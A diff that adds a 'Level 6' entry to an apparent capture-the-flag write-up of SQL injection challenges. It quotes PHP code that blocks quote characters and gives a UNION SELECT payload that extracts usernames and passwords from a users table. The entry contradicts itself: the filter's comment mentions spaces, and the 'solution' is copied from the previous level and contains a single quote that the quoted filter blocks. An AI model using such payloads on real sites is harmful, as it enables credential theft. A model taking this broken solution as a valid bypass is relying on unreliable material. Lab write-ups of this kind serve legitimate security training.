@@ -142,3 +142,17 @@ Explanation:-------------------------------------------------------------------
 Solution:----------------------------------------------------------------------
     %'/**/UNION(SELECT(users.username),(users.password),(3)FROM(users));#
 
+###############################################################################
+Level 6
+##############################################################################
+Explanation:-------------------------------------------------------------------
+  In this level, they tried to ban double and single quotes:
+
+    if (isset($_GET['q'])) {
+      // Ban space character
+      if (strpos($_GET['q'], "'") !== false) die("Hacker detected"); 
+      if (strpos($_GET['q'], '"') !== false) die("Hacker detected"); 
+    }
+
+Solution:----------------------------------------------------------------------
+    %'/**/UNION(SELECT(users.username),(users.password),(3)FROM(users));#
